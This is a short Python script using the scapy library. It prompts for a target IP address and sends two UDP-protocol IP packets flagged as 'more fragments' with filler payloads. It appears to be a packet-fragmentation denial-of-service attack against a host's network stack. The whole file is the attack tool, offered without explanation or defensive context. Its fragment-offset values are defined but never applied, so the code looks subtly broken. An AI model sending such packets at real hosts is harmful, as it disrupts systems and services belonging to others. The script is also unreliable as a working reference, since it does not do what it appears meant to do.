import os,sys
from scapy.all import *

targetIP=raw_input("Target IP Address: ")

size1=1300
offset1=80
load1="A"*size1

a=IP(dst=targetIP, flags="MF",proto=17)/load1

size2=4
offset2=18
load2=" "*size2

b=IP(dst=targetIP, flags="MF", proto=17)/load2

send(a)
send(b)

